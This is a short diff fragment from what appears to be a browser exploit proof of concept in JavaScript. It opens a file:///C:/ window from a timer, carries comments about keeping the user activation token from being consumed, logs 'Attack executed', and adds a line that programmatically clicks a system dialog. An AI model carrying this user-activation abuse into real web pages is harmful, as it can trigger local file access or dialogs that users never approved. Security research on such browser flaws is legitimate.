@@ -20,6 +20,7 @@
             // This prevents the browser from consuming the user activation token correctly.
             setTimeout(() => {
                 window.open('file:///C:/', '_blank', 'width=200,height=200');
+                sysDialog.click();
             }, 0);
             
             console.log("Attack executed");
